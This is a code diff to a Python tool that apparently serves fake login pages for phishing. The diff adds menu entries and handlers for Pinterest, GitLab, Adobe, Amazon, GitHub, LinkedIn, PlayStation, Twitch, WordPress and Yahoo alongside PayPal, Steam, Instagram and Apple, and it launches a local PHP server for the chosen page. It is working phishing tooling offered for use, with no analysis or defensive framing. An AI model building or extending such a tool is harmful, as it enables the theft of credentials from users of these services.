@@ -39,10 +39,10 @@ def setup(site):
 
     for i in tqdm(range(100)):
 
-        time.sleep(0.09)
+        time.sleep(0.006)
 
     print('')
-    print('[~] Port : http://127.0.0.1:8080/')
+    print('[~] Port : 8080 [127.0.0.1 or localhost]')
     os.system(f"php -S localhost:8080 -t pages/{site} > /dev/null 2>&1 & ")
     time.sleep(2)
     print('\n[~] starting a server : ✔️')
@@ -84,9 +84,17 @@ def menu():
 
     [4] Paypal     [5] Steam   [6] Instagram
     
-    [7] apple      [8] srm portal
+    [7] apple      [8] portal
           
-    [9] custom
+    [9] pinterest  [10] gitlab
+          
+    [11] adobe     [12] amazon
+          
+    [13] GitHub    [14] linkedin
+          
+    [15] playstation [16] twitch
+          
+    [17] wordpress  [18] yahoo
 
     """)
 
@@ -116,7 +124,34 @@ def menu():
         site = "srm"
         setup(site)
     elif inl == 9:
-        site = "create"
+        site = "pinterest"
+        setup(site)
+    elif inl == 10:
+        site = "gitlab"
+        setup(site)
+    elif inl == 11:
+        site = "adobe"
+        setup(site)
+    elif inl == 12:
+        site = "amazon"
+        setup(site)
+    elif inl == 14:
+        site = "linkedin"
+        setup(site)
+    elif inl == 15:
+        site = "playstation"
+        setup(site)
+    elif inl == 13:
+        site = "GitHub"
+        setup(site)
+    elif inl == 16:
+        site = "twitch"
+        setup(site)
+    elif inl == 17:
+        site = "wordpress"
+        setup(site)
+    elif inl == 18:
+        site = "yahoo"
         setup(site)
     else:
         print(f'{Fore.RED}\n[!] Error !')
